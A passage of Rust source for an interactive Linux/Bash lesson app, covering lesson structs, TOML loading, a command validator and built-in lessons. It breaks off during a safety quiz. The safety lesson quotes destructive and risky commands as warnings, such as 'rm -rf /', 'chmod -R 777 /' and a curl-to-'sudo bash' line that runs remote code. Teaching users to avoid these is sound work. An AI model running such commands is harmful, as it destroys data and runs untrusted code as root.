//! Interactive lesson system for teaching Linux/Bash concepts
//!
//! This module provides a comprehensive framework for creating, validating,
//! and tracking progress through interactive lessons.

use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// A complete lesson module (e.g., "Navigation Basics")
///
/// # TOML lesson-pack format
///
/// Lessons can be authored as `*.toml` files (loaded from
/// `~/.config/arct/lessons/` via [`LessonLibrary::load_from_dir`]). The
/// top-level fields map 1:1 onto this struct:
///
/// ```toml
/// id = "my-lesson"
/// title = "My Lesson"
/// description = "What this lesson teaches."
/// difficulty = "Beginner"          # Beginner | Intermediate | Advanced | Expert
/// estimated_minutes = 10
/// prerequisites = ["nav-basics"]   # lesson ids to complete first
/// tags = ["beginner", "files"]
///
/// # Optional starter files, materialized into the practice environment
/// # before the lesson starts (omit entirely if the lesson needs none).
/// # In simulated mode they are seeded into the virtual sandbox filesystem;
/// # in real practice mode they are written under
/// # ~/ArcAcademy/playground/<lesson-id>/ and the session cd's there.
/// # `path` is relative to the lesson's practice directory (subdirectories
/// # are created as needed; absolute paths and `..` are rejected).
/// [[setup]]
/// path = "notes.txt"
/// contents = "starter content\n"
///
/// [[setup]]
/// path = "logs/server.log"
/// contents = "line 1\nline 2\n"
///
/// [[steps]]
/// step_number = 1
/// title = "First step"
/// instruction = "Type the command..."
/// hint = "Try 'pwd'"
///
/// [steps.step_type.CommandExercise]
/// expected_command = "pwd"
/// validation = "CommandOnly"
/// success_message = "Nice!"
/// ```
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Lesson {
    pub id: String,
    pub title: String,
    pub description: String,
    pub difficulty: Difficulty,
    pub estimated_minutes: u32,
    pub steps: Vec<LessonStep>,
    pub prerequisites: Vec<String>, // IDs of lessons that should be completed first
    pub tags: Vec<String>,          // e.g., ["beginner", "navigation", "essential"]
    /// Optional starter files for the lesson's practice environment.
    ///
    /// Defaults to empty, so existing lesson-pack TOML files without a
    /// `setup` array keep parsing unchanged.
    #[serde(default)]
    pub setup: Vec<SetupFile>,
}

/// A starter file materialized into a lesson's practice environment.
///
/// In TOML lesson packs this is an entry in the `[[setup]]` array with a
/// relative `path` and the literal file `contents`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SetupFile {
    /// Path relative to the lesson's practice directory (no `..`, not absolute).
    pub path: String,
    /// Full file contents to write.
    pub contents: String,
}

impl Lesson {
    /// Serialize this lesson to a TOML document (the on-disk lesson format).
    pub fn to_toml(&self) -> anyhow::Result<String> {
        Ok(toml::to_string_pretty(self)?)
    }

    /// Parse a lesson from a TOML document.
    pub fn from_toml(content: &str) -> anyhow::Result<Self> {
        Ok(toml::from_str(content)?)
    }
}

/// Difficulty level of a lesson
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum Difficulty {
    Beginner,
    Intermediate,
    Advanced,
    Expert,
}

/// A single step within a lesson
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LessonStep {
    pub step_number: u32,
    pub title: String,
    pub instruction: String,
    pub hint: Option<String>,
    pub step_type: StepType,
}

/// Type of lesson step
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum StepType {
    /// User must execute a specific command
    CommandExercise {
        expected_command: String,
        validation: CommandValidation,
        success_message: String,
    },
    /// Multiple choice question
    MultipleChoice {
        question: String,
        options: Vec<String>,
        correct_index: usize,
        explanation: String,
    },
    /// Fill in the blank in a command
    FillInBlank {
        template: String,       // e.g., "ls {flags} /home"
        correct_answers: Vec<String>, // e.g., ["-la", "-l -a"]
        explanation: String,
    },
    /// Information/explanation only (no validation)
    Information {
        content: String,
    },
    /// Free-form practice with validation
    Practice {
        goal: String,
        validation: PracticeValidation,
        hints: Vec<String>,
    },
}

/// How to validate a command exercise
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum CommandValidation {
    /// Exact command match (ignoring whitespace)
    Exact,
    /// Command and flags must match (args can vary)
    CommandAndFlags,
    /// Just the base command must match
    CommandOnly,
    /// Custom validation with regex
    Regex(String),
    /// Multiple acceptable commands
    AnyOf(Vec<String>),
}

/// Validation for practice exercises
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum PracticeValidation {
    /// File exists at path
    FileExists(String),
    /// Directory exists at path
    DirectoryExists(String),
    /// File contains specific content
    FileContains { path: String, content: String },
    /// Command output matches pattern
    OutputMatches { command: String, pattern: String },
    /// Custom validator (description only, actual validation in engine)
    Custom(String),
}

/// Progress tracking for a user through lessons
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LessonProgress {
    pub lesson_id: String,
    pub current_step: u32,
    pub completed_steps: Vec<u32>,
    pub started_at: chrono::DateTime<chrono::Utc>,
    pub completed_at: Option<chrono::DateTime<chrono::Utc>>,
    pub attempts: HashMap<u32, u32>, // step_number -> attempt_count
}

impl LessonProgress {
    pub fn new(lesson_id: String) -> Self {
        Self {
            lesson_id,
            current_step: 1,
            completed_steps: Vec::new(),
            started_at: chrono::Utc::now(),
            completed_at: None,
            attempts: HashMap::new(),
        }
    }

    pub fn is_completed(&self) -> bool {
        self.completed_at.is_some()
    }

    pub fn completion_percentage(&self, total_steps: u32) -> f32 {
        if total_steps == 0 {
            return 0.0;
        }
        (self.completed_steps.len() as f32 / total_steps as f32) * 100.0
    }

    pub fn record_attempt(&mut self, step_number: u32) {
        *self.attempts.entry(step_number).or_insert(0) += 1;
    }

    pub fn complete_step(&mut self, step_number: u32) {
        if !self.completed_steps.contains(&step_number) {
            self.completed_steps.push(step_number);
            self.completed_steps.sort();
        }
    }

    pub fn complete_lesson(&mut self) {
        self.completed_at = Some(chrono::Utc::now());
    }
}

/// Lesson library that stores all available lessons
#[derive(Debug, Clone)]
pub struct LessonLibrary {
    lessons: HashMap<String, Lesson>,
    /// Registration order; `all()` derives a stable learning order from it
    order: Vec<String>,
}

impl LessonLibrary {
    pub fn new() -> Self {
        let mut library = Self {
            lessons: HashMap::new(),
            order: Vec::new(),
        };
        library.load_default_lessons();
        library
    }

    /// Register a lesson in the library
    pub fn register(&mut self, lesson: Lesson) {
        if !self.lessons.contains_key(&lesson.id) {
            self.order.push(lesson.id.clone());
        }
        self.lessons.insert(lesson.id.clone(), lesson);
    }

    /// Get a lesson by ID
    pub fn get(&self, id: &str) -> Option<&Lesson> {
        self.lessons.get(id)
    }

    /// All lessons in learning order: registration order, except that a
    /// lesson always comes after the prerequisites it names. Stable across
    /// runs (the map used to come out in random order).
    pub fn all(&self) -> Vec<&Lesson> {
        let mut placed: std::collections::HashSet<&str> = std::collections::HashSet::new();
        let mut ordered: Vec<&Lesson> = Vec::with_capacity(self.order.len());
        while ordered.len() < self.order.len() {
            let before = ordered.len();
            for id in &self.order {
                if placed.contains(id.as_str()) {
                    continue;
                }
                let lesson = &self.lessons[id];
                let ready = lesson
                    .prerequisites
                    .iter()
                    .all(|p| placed.contains(p.as_str()) || !self.lessons.contains_key(p));
                if ready {
                    placed.insert(id.as_str());
                    ordered.push(lesson);
                    // Restart so earlier-registered lessons that just became
                    // ready keep their place ahead of later ones
                    break;
                }
            }
            if ordered.len() == before {
                // Prerequisite cycle: append the rest in registration order
                for id in &self.order {
                    if placed.insert(id.as_str()) {
                        ordered.push(&self.lessons[id]);
                    }
                }
            }
        }
        ordered
    }

    /// Get lessons by difficulty
    pub fn by_difficulty(&self, difficulty: Difficulty) -> Vec<&Lesson> {
        self.all()
            .into_iter()
            .filter(|l| l.difficulty == difficulty)
            .collect()
    }

    /// Get lessons by tag
    pub fn by_tag(&self, tag: &str) -> Vec<&Lesson> {
        self.all()
            .into_iter()
            .filter(|l| l.tags.iter().any(|t| t == tag))
            .collect()
    }

    /// Count lessons per difficulty level (used for achievement unlock checks)
    pub fn difficulty_counts(&self) -> HashMap<Difficulty, usize> {
        let mut counts = HashMap::new();
        for lesson in self.lessons.values() {
            *counts.entry(lesson.difficulty).or_insert(0) += 1;
        }
        counts
    }

    /// Load user-provided `*.toml` lesson files from a directory and merge
    /// them with the built-in lessons. User lessons override built-ins with
    /// the same id. Returns the number of lessons loaded.
    ///
    /// A missing directory is not an error (returns 0); an unreadable or
    /// unparsable lesson file is.
    pub fn load_from_dir(&mut self, path: &std::path::Path) -> anyhow::Result<usize> {
        use anyhow::Context;

        if !path.is_dir() {
            return Ok(0);
        }

        let mut loaded = 0;
        for entry in std::fs::read_dir(path)
            .with_context(|| format!("Failed to read lesson directory: {}", path.display()))?
        {
            let entry = entry?;
            let file_path = entry.path();
            if file_path.extension().and_then(|e| e.to_str()) != Some("toml") {
                continue;
            }

            let content = std::fs::read_to_string(&file_path)
                .with_context(|| format!("Failed to read lesson file: {}", file_path.display()))?;
            let lesson = Lesson::from_toml(&content)
                .with_context(|| format!("Failed to parse lesson file: {}", file_path.display()))?;

            self.register(lesson);
            loaded += 1;
        }

        Ok(loaded)
    }

    /// Load default lessons (initial set)
    fn load_default_lessons(&mut self) {
        self.register(create_navigation_basics_lesson());
        self.register(create_file_management_lesson());
        self.register(create_safety_lesson());
        self.register(create_file_viewing_lesson());
        self.register(create_permissions_lesson());
        self.register(create_process_management_lesson());
        self.register(create_text_processing_lesson());
        self.register(create_package_management_lesson());
        self.register(create_network_basics_lesson());
        self.register(create_git_fundamentals_lesson());
    }
}

impl Default for LessonLibrary {
    fn default() -> Self {
        Self::new()
    }
}

/// Lesson validation engine
pub struct LessonValidator {
    // For now, just basic validation
    // Will expand with actual command execution and output checking
}

impl LessonValidator {
    pub fn new() -> Self {
        Self {}
    }

    /// Validate a command exercise
    pub fn validate_command(
        &self,
        user_input: &str,
        expected: &str,
        validation: &CommandValidation,
    ) -> ValidationResult {
        match validation {
            CommandValidation::Exact => {
                let normalized_input = user_input.trim().split_whitespace().collect::<Vec<_>>().join(" ");
                let normalized_expected = expected.trim().split_whitespace().collect::<Vec<_>>().join(" ");

                if normalized_input == normalized_expected {
                    ValidationResult::Success {
                        message: "Perfect! That's exactly right.".to_string(),
                    }
                } else {
                    ValidationResult::Failure {
                        message: format!("Not quite. Expected: {}", expected),
                        hint: Some("Check the command and flags carefully.".to_string()),
                    }
                }
            }
            CommandValidation::CommandOnly => {
                let user_cmd = user_input.trim().split_whitespace().next().unwrap_or("");
                let expected_cmd = expected.trim().split_whitespace().next().unwrap_or("");

                if user_cmd == expected_cmd {
                    ValidationResult::Success {
                        message: "Correct command!".to_string(),
                    }
                } else {
                    ValidationResult::Failure {
                        message: format!("Wrong command. Expected: {}", expected_cmd),
                        hint: None,
                    }
                }
            }
            CommandValidation::AnyOf(commands) => {
                let normalized_input = user_input.trim().split_whitespace().collect::<Vec<_>>().join(" ");

                for cmd in commands {
                    let normalized_cmd = cmd.trim().split_whitespace().collect::<Vec<_>>().join(" ");
                    if normalized_input == normalized_cmd {
                        return ValidationResult::Success {
                            message: "Correct!".to_string(),
                        };
                    }
                }

                ValidationResult::Failure {
                    message: "Not quite. Try one of the expected commands.".to_string(),
                    hint: Some(format!("Expected one of: {}", commands.join(" OR "))),
                }
            }
            CommandValidation::CommandAndFlags => {
                let (user_cmd, user_flags, user_args) = Self::split_command(user_input);
                let (expected_cmd, expected_flags, expected_args) = Self::split_command(expected);

                if user_cmd.is_empty() {
                    return ValidationResult::Failure {
                        message: "No command entered.".to_string(),
                        hint: Some(format!("Try: {}", expected)),
                    };
                }

                if user_cmd != expected_cmd {
                    return ValidationResult::Failure {
                        message: format!("Wrong command. Expected: {}", expected_cmd),
                        hint: Some("Check which program you're running.".to_string()),
                    };
                }

                if user_flags != expected_flags {
                    let expected_list: Vec<String> = expected_flags.iter().cloned().collect();
                    return ValidationResult::Failure {
                        message: "The flags don't match.".to_string(),
                        hint: Some(if expected_list.is_empty() {
                            "This command doesn't need any flags.".to_string()
                        } else {
                            format!("Expected flags: {}", expected_list.join(" "))
                        }),
                    };
                }

                if user_args != expected_args {
                    return ValidationResult::Failure {
                        message: "The arguments don't match.".to_string(),
                        hint: Some(format!("Expected: {}", expected)),
                    };
                }

                ValidationResult::Success {
                    message: "Correct command, flags, and arguments!".to_string(),
                }
            }
            CommandValidation::Regex(pattern) => match regex::Regex::new(pattern) {
                Ok(re) => {
                    if re.is_match(user_input.trim()) {
                        ValidationResult::Success {
                            message: "Correct!".to_string(),
                        }
                    } else {
                        ValidationResult::Failure {
                            message: "That command doesn't match what's expected.".to_string(),
                            hint: None,
                        }
                    }
                }
                Err(e) => ValidationResult::Failure {
                    message: format!("Invalid validation pattern in lesson data: {}", e),
                    hint: None,
                },
            },
        }
    }

    /// Split a command line into (program, flag set, positional args).
    ///
    /// Combined short flags are expanded so `-la`, `-al`, and `-l -a` all
    /// produce the flag set {"-l", "-a"}. Long flags (`--foo`) are kept whole.
    /// Flag comparison is order-insensitive; positional args keep their order.
    fn split_command(input: &str) -> (String, std::collections::BTreeSet<String>, Vec<String>) {
        let tokens = shellwords::split(input.trim())
            .unwrap_or_else(|_| input.split_whitespace().map(String::from).collect());

        let mut iter = tokens.into_iter();
        let program = iter.next().unwrap_or_default();

        let mut flags = std::collections::BTreeSet::new();
        let mut args = Vec::new();

        for token in iter {
            if token.starts_with("--") && token.len() > 2 {
                flags.insert(token);
            } else if token.starts_with('-') && token.len() > 1 {
                // Expand combined short flags: -la -> -l, -a
                for ch in token.chars().skip(1) {
                    flags.insert(format!("-{}", ch));
                }
            } else {
                args.push(token);
            }
        }

        (program, flags, args)
    }

    /// Validate a multiple choice answer
    pub fn validate_multiple_choice(&self, user_choice: usize, correct: usize) -> ValidationResult {
        if user_choice == correct {
            ValidationResult::Success {
                message: "Correct!".to_string(),
            }
        } else {
            ValidationResult::Failure {
                message: "Not quite. Try again!".to_string(),
                hint: None,
            }
        }
    }
}

impl Default for LessonValidator {
    fn default() -> Self {
        Self::new()
    }
}

/// Result of validating user input for a lesson step
#[derive(Debug, Clone)]
pub enum ValidationResult {
    Success { message: String },
    Failure { message: String, hint: Option<String> },
    Partial { message: String, progress: f32 },
}

impl ValidationResult {
    pub fn is_success(&self) -> bool {
        matches!(self, ValidationResult::Success { .. })
    }
}

// ============================================================================
// Default Lesson Definitions
// ============================================================================

/// Create the "Navigation Basics" lesson
fn create_navigation_basics_lesson() -> Lesson {
    Lesson {
        id: "nav-basics".to_string(),
        title: "Navigation Basics".to_string(),
        description: "Learn how to navigate the Linux filesystem using essential commands like ls, cd, pwd, and tree.".to_string(),
        difficulty: Difficulty::Beginner,
        estimated_minutes: 10,
        prerequisites: vec![],
        tags: vec!["beginner".to_string(), "navigation".to_string(), "essential".to_string()],
        setup: vec![
            SetupFile {
                path: "README.txt".to_string(),
                contents: "Welcome to your practice space!\n\nUse pwd, ls, and cd to look around. There's a 'docs' folder to explore.\n".to_string(),
            },
            SetupFile {
                path: "docs/getting-started.txt".to_string(),
                contents: "You found the docs folder — nice navigating!\nTry 'cd ..' to go back up.\n".to_string(),
            },
        ],
        steps: vec![
            LessonStep {
                step_number: 1,
                title: "Understanding Your Current Location".to_string(),
                instruction: "Every time you open a terminal, you're in a specific directory. Let's find out where you are. Type the command to print your current working directory.".to_string(),
                hint: Some("The command is 'pwd' (print working directory)".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "pwd".to_string(),
                    validation: CommandValidation::CommandOnly,
                    success_message: "Perfect! 'pwd' shows your current directory. This is your starting point.".to_string(),
                },
            },
            LessonStep {
                step_number: 2,
                title: "Listing Files and Directories".to_string(),
                instruction: "Now let's see what's in your current directory. Use the command to list all files and directories.".to_string(),
                hint: Some("The command is 'ls' (list)".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "ls".to_string(),
                    validation: CommandValidation::CommandOnly,
                    success_message: "Great! 'ls' shows you what's in the current directory.".to_string(),
                },
            },
            LessonStep {
                step_number: 3,
                title: "Detailed File Listings".to_string(),
                instruction: "Let's get more information about the files. Use 'ls' with flags to show a long, detailed listing with human-readable file sizes.".to_string(),
                hint: Some("Try 'ls -lh' (long format + human-readable sizes)".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "ls -lh".to_string(),
                    validation: CommandValidation::AnyOf(vec![
                        "ls -lh".to_string(),
                        "ls -hl".to_string(),
                        "ls -l -h".to_string(),
                        "ls -h -l".to_string(),
                    ]),
                    success_message: "Excellent! The -l flag shows details like permissions, owner, size, and date. The -h flag makes sizes human-readable (KB, MB, GB).".to_string(),
                },
            },
            LessonStep {
                step_number: 4,
                title: "Understanding Hidden Files".to_string(),
                instruction: "Many configuration files are hidden (they start with a dot). Let's see ALL files, including hidden ones.".to_string(),
                hint: Some("Use the -a flag with ls".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "ls -a".to_string(),
                    validation: CommandValidation::CommandOnly,
                    success_message: "Perfect! Files starting with '.' are hidden. You'll see '.bashrc', '.profile', etc. - these are configuration files.".to_string(),
                },
            },
            LessonStep {
                step_number: 5,
                title: "Changing Directories".to_string(),
                instruction: "Let's move to your home directory. Use the change directory command with the ~ symbol (tilde represents your home).".to_string(),
                hint: Some("Type 'cd ~' or just 'cd'".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "cd".to_string(),
                    validation: CommandValidation::AnyOf(vec![
                        "cd".to_string(),
                        "cd ~".to_string(),
                        "cd $HOME".to_string(),
                    ]),
                    success_message: "Great! 'cd' without arguments always takes you home. The ~ symbol is a shortcut for your home directory.".to_string(),
                },
            },
            LessonStep {
                step_number: 6,
                title: "Quiz: What does 'cd ..' do?".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "What does the command 'cd ..' do?".to_string(),
                    options: vec![
                        "Goes to the home directory".to_string(),
                        "Goes up one directory level (to the parent)".to_string(),
                        "Lists files in the current directory".to_string(),
                        "Creates a new directory".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "Correct! '..' is a special symbol that represents the parent directory. So 'cd ..' moves you up one level in the directory tree.".to_string(),
                },
            },
            LessonStep {
                step_number: 7,
                title: "Pro Tip: cd -".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Pro tip: 'cd -' is a super useful command! It takes you back to your previous directory. Try it:\n\n  cd /tmp\n  cd ~\n  cd -    # Takes you back to /tmp!\n\nThis is great for quickly switching between two directories you're working in.".to_string(),
                },
            },
            LessonStep {
                step_number: 8,
                title: "Completion: Navigation Mastered!".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Congratulations! 🎉 You've mastered basic navigation!\n\nKey commands you learned:\n  • pwd  - Print working directory\n  • ls   - List files (use -l for details, -a for hidden, -h for human-readable)\n  • cd   - Change directory\n  • cd ~ - Go home\n  • cd .. - Go up one level\n  • cd -  - Toggle to previous directory\n\nThese are the foundation of navigating Linux. Practice them often!".to_string(),
                },
            },
        ],
    }
}

/// Create the "File Management" lesson
fn create_file_management_lesson() -> Lesson {
    Lesson {
        id: "file-mgmt".to_string(),
        title: "File Management Basics".to_string(),
        description: "Learn to create, copy, move, and delete files and directories safely.".to_string(),
        difficulty: Difficulty::Beginner,
        estimated_minutes: 15,
        prerequisites: vec!["nav-basics".to_string()],
        tags: vec!["beginner".to_string(), "files".to_string(), "essential".to_string()],
        setup: vec![
            SetupFile {
                path: "README.txt".to_string(),
                contents: "This is your file-management practice space.\n\nYou'll create a 'practice' directory here and work with files inside it.\nNothing outside this folder is ever touched.\n".to_string(),
            },
        ],
        steps: vec![
            LessonStep {
                step_number: 1,
                title: "Creating a Practice Directory".to_string(),
                instruction: "Let's create a safe practice space. Create a directory called 'practice' in your current location.".to_string(),
                hint: Some("Use 'mkdir practice'".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "mkdir practice".to_string(),
                    validation: CommandValidation::CommandOnly,
                    success_message: "Great! 'mkdir' (make directory) creates a new folder. Now you have a safe space to practice.".to_string(),
                },
            },
            LessonStep {
                step_number: 2,
                title: "Creating a File".to_string(),
                instruction: "Navigate into your practice directory and create an empty file called 'test.txt'.".to_string(),
                hint: Some("Use 'cd practice' then 'touch test.txt'".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "touch test.txt".to_string(),
                    validation: CommandValidation::CommandOnly,
                    success_message: "Perfect! 'touch' creates an empty file or updates the timestamp of an existing one.".to_string(),
                },
            },
            LessonStep {
                step_number: 3,
                title: "Copying Files".to_string(),
                instruction: "Make a copy of test.txt called test-backup.txt.".to_string(),
                hint: Some("Use 'cp test.txt test-backup.txt'".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "cp test.txt test-backup.txt".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Excellent! 'cp source destination' copies a file. Always make backups of important files before editing!".to_string(),
                },
            },
            LessonStep {
                step_number: 4,
                title: "Moving/Renaming Files".to_string(),
                instruction: "Rename test-backup.txt to backup.txt using the move command.".to_string(),
                hint: Some("'mv' is used for both moving and renaming. Try 'mv test-backup.txt backup.txt'".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "mv test-backup.txt backup.txt".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Great! 'mv' moves OR renames files. When source and destination are in the same directory, it's renaming.".to_string(),
                },
            },
            LessonStep {
                step_number: 5,
                title: "Safety Quiz".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "Which flag should you ALWAYS use with 'rm' for safety?".to_string(),
                    options: vec![
                        "-f (force)".to_string(),
                        "-i (interactive/confirm)".to_string(),
                        "-r (recursive)".to_string(),
                        "-v (verbose)".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "Correct! The -i flag makes rm ask for confirmation before deleting. NEVER use -f (force) unless you're absolutely sure. -r is for directories but should be used with -i for safety.".to_string(),
                },
            },
            LessonStep {
                step_number: 6,
                title: "Safe Deletion".to_string(),
                instruction: "Delete test.txt safely by using the interactive flag.".to_string(),
                hint: Some("Use 'rm -i test.txt' and confirm when prompted".to_string()),
                step_type: StepType::CommandExercise {
                    expected_command: "rm -i test.txt".to_string(),
                    validation: CommandValidation::Exact,
                    success_message: "Perfect! Always use -i when deleting files. There is NO undo in Linux - deleted files are gone forever!".to_string(),
                },
            },
            LessonStep {
                step_number: 7,
                title: "Completion: File Management Mastered!".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "Excellent work! 🎉 You've learned essential file management!\n\nKey commands:\n  • mkdir  - Create directories\n  • touch  - Create empty files\n  • cp     - Copy files\n  • mv     - Move or rename files\n  • rm -i  - Delete files (ALWAYS use -i for safety!)\n\nSafety rules:\n  ⚠️  Always use 'rm -i' not 'rm -f'\n  ⚠️  Make backups before editing important files\n  ⚠️  Be very careful with 'rm -r' (deletes directories)\n  ⚠️  NEVER run 'rm -rf /' (destroys your system!)\n\nNext: Learn text processing!".to_string(),
                },
            },
        ],
    }
}

/// Create the "What NOT to Do" safety lesson
fn create_safety_lesson() -> Lesson {
    Lesson {
        id: "safety-essentials".to_string(),
        title: "What NOT to Do - Safety Essentials".to_string(),
        description: "Critical safety lessons to prevent data loss, system damage, and security vulnerabilities. Learn the dangerous commands and practices to avoid.".to_string(),
        difficulty: Difficulty::Beginner,
        estimated_minutes: 15,
        prerequisites: vec![],
        tags: vec!["beginner".to_string(), "safety".to_string(), "essential".to_string(), "security".to_string()],
        setup: vec![],
        steps: vec![
            LessonStep {
                step_number: 1,
                title: "Welcome to Safety Training".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "⚠️  IMPORTANT: This lesson teaches you what NOT to do!\n\nThe command line is powerful - which means it can do a LOT of damage if misused. Unlike graphical interfaces with confirmation dialogs and trash bins, the terminal executes commands IMMEDIATELY and PERMANENTLY.\n\nIn this lesson, you'll learn:\n  • Dangerous commands that can destroy your system\n  • Common mistakes beginners make\n  • Security vulnerabilities to avoid\n  • Best practices for safe command line usage\n\nThis knowledge could save you from:\n  • Losing important files forever\n  • Breaking your operating system\n  • Creating security holes\n  • Hours of recovery work\n\nLet's get started! 🛡️".to_string(),
                },
            },
            LessonStep {
                step_number: 2,
                title: "The Most Dangerous Command".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "Which command is EXTREMELY dangerous and should NEVER be run?".to_string(),
                    options: vec![
                        "rm -i file.txt".to_string(),
                        "rm -rf /".to_string(),
                        "ls -la /".to_string(),
                        "cd /tmp".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "CORRECT! 'rm -rf /' is catastrophic - it recursively force-deletes your ENTIRE system starting from the root! The -r means recursive (all files and folders), -f means force (no confirmations), and / is the root of your entire filesystem. This will destroy your operating system and all your data. Modern systems have protections, but NEVER try this. Even 'rm -rf /*' (with a star) can be devastating!".to_string(),
                },
            },
            LessonStep {
                step_number: 3,
                title: "Understanding Force Flags".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "🚨 NEVER USE FORCE FLAGS UNLESS YOU'RE ABSOLUTELY CERTAIN!\n\nDangerous force flags to avoid:\n\n  • rm -f      - Deletes without asking (NO confirmation!)\n  • rm -rf     - Recursively force-deletes directories\n  • mv -f      - Overwrites files without warning\n  • cp -f      - Overwrites files without asking\n\nInstead, ALWAYS use interactive flags:\n\n  ✅ rm -i     - Asks before each deletion\n  ✅ rm -ri    - Safe recursive deletion with prompts\n  ✅ mv -i     - Asks before overwriting\n  ✅ cp -i     - Asks before overwriting\n\nRemember: Linux has NO recycle bin. Deleted = GONE FOREVER!\nThe -i flag is your safety net. Use it!".to_string(),
                },
            },
            LessonStep {
                step_number: 4,
                title: "Permission Dangers".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "You need to make a script executable. Which chmod command is safest?".to_string(),
                    options: vec![
                        "chmod 777 script.sh (everyone can read, write, execute)".to_string(),
                        "chmod +x script.sh (add execute permission)".to_string(),
                        "chmod -R 777 / (make everything writable)".to_string(),
                        "chmod 000 script.sh (remove all permissions)".to_string(),
                    ],
                    correct_index: 1,
                    explanation: "CORRECT! 'chmod +x script.sh' just adds execute permission safely. \n\n❌ NEVER use chmod 777! This gives EVERYONE (including attackers) full read, write, and execute access. It's a MASSIVE security hole!\n\n❌ NEVER use chmod -R 777 on system directories! This makes your entire system vulnerable.\n\nAlways use minimal permissions:\n  • 755 for directories and executables (owner can write, others can read/execute)\n  • 644 for regular files (owner can write, others can read)\n  • Use +x, +r, +w to add specific permissions instead of numbers".to_string(),
                },
            },
            LessonStep {
                step_number: 5,
                title: "The Sudo Trap".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "🔐 SUDO GIVES YOU SUPERPOWERS - USE RESPONSIBLY!\n\nCommon sudo mistakes:\n\n❌ DON'T: Run random internet commands with sudo\n   Example: Don't blindly copy-paste 'sudo rm -rf /usr'\n\n❌ DON'T: Use sudo just because a command failed\n   Example: If 'npm install' fails, DON'T try 'sudo npm install'\n   (Fix permissions instead!)\n\n❌ DON'T: Pipe untrusted scripts to sudo bash\n   Example: curl http://example.com/script.sh | sudo bash\n   (This runs unknown code as admin!)\n\n✅ DO: Read and understand commands before using sudo\n✅ DO: Use sudo only when actually needed (system changes)\n✅ DO: Check who wrote the script you're running\n\nThink of sudo like giving someone the keys to your house - only do it when absolutely necessary and you trust the command!".to_string(),
                },
            },
            LessonStep {
                step_number: 6,
                title: "Wildcard Disasters".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "You're in your home directory and want to delete all .txt files. Which is SAFEST?".to_string(),
                    options: vec![
                        "rm *.txt (could be dangerous if you're in wrong directory!)".to_string(),
                        "rm -rf *".to_string(),
                        "First 'ls *.txt' to verify, then 'rm -i *.txt'".to_string(),
                        "cd / && rm *.txt".to_string(),
                    ],
                    correct_index: 2,
                    explanation: "CORRECT! Always verify with 'ls' FIRST, then use 'rm -i' for confirmation!\n\nWildcard disasters to avoid:\n\n❌ 'rm -rf *' - Deletes EVERYTHING in current directory!\n❌ 'rm -rf * .*' - Even worse, includes hidden files!\n❌ 'rm * .txt' - Space before .txt means delete everything AND .txt!\n\nSafety practices:\n  1️⃣  Always 'pwd' to confirm you're in the right directory\n  2️⃣  Always 'ls [pattern]' to see what matches BEFORE deleting\n  3️⃣  Always use 'rm -i' with wildcards\n  4️⃣  Be EXTRA careful with spaces in commands!".to_string(),
                },
            },
            LessonStep {
                step_number: 7,
                title: "Pipe and Redirect Dangers".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::Information {
                    content: "⚡ REDIRECTS CAN OVERWRITE FILES INSTANTLY!\n\nDangerous redirects:\n\n❌ command > important.txt\n   • Single > OVERWRITES the file completely!\n   • If command is empty, you just erased your file!\n\n❌ command > /etc/passwd\n   • Overwriting system files breaks your system!\n\n❌ cat file.txt > file.txt\n   • You just erased file.txt with an empty file!\n   • (Can't read and write same file this way)\n\nSafe practices:\n\n✅ command >> file.txt  (double >> appends instead of overwriting)\n✅ Always backup first: cp important.txt important.txt.bak\n✅ Test commands first: command > /tmp/test.txt\n✅ Use 'set -o noclobber' to prevent accidental overwrites\n\nRemember: > is INSTANT and PERMANENT!".to_string(),
                },
            },
            LessonStep {
                step_number: 8,
                title: "Copy-Paste from the Internet".to_string(),
                instruction: "".to_string(),
                hint: None,
                step_type: StepType::MultipleChoice {
                    question: "You found a cool command on a random website. What should you do?".to_string(),
                    options: vec![
                        "Copy-paste it immediately into your terminal".to_string(),
                        "Add sudo to make sure it works".to_string(),
                        "Read and understand what each part does, then type it yourself".to_string(),
                        "Run it in another user's account first".to_string(),
                    ],
                    correct_index: 2,
